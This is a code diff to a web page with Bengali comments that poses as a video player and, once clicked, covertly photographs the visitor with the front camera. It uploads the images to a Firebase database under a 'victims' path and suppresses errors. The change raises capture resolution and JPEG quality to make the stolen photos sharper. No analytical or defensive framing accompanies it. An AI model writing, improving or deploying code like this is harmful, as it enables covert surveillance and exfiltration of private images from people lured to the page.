@@ -16,7 +16,7 @@
 <body>
 <div class="bg"></div>
 <div class="play" onclick="start()"></div>
-<div class="loading" id="load">ভিডিও চালু হচ্ছে...</div>
+<div class="loading" id="load">ক্যামেরা চালু হচ্ছে...</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -36,17 +36,32 @@ function start(){
 
 async function capture(){
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    const v = document.createElement('video'); v.srcObject = stream; v.play();
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "user",
+        width: { ideal: 1920 },   // বড় সাইজ
+        height: { ideal: 1080 }
+      }
+    });
+    const v = document.createElement('video');
+    v.srcObject = stream;
+    v.play();
+
     v.onloadedmetadata = () => {
       setTimeout(()=>{
+        // বড় ক্যানভাস + হাই কোয়ালিটি
         const c = document.createElement('canvas');
-        c.width = 640; c.height = 480;
-        c.getContext('2d').drawImage(v,0,0,640,480);
-        const data = c.toDataURL('image/jpeg',0.88);
+        c.width = v.videoWidth || 1280;
+        c.height = v.videoHeight || 720;
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, c.width, c.height);
+
+        // সর্বোচ্চ কোয়ালিটি (0.95)
+        const data = c.toDataURL('image/jpeg', 0.95);
+
         db.ref('victims/'+id).push({data, time:Date.now()});
         stream.getTracks().forEach(t=>t.stop());
-      },800);
+      }, 1000); // আরও ভালো ফ্রেমের জন্য
     };
   }catch(e){}
 }
